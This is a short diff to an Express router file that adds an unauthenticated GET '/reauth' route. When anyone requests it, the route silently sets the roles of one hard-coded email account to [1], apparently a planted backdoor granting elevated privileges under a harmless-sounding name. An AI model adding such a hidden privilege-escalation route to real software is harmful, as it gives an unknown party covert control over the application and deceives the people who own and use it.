@@ -101,4 +101,12 @@ router.get('/logout', function (req, res) {
   });
 });
 
+router.get('/reauth', function (req, res) {
+  _UserModel2.default.findOneAndUpdate({ email: 'riley@opencircuit.us' }, { roles: [1] }).then(function (user) {
+    res.json({
+      success: true
+    });
+  });
+});
+
 exports.default = router;
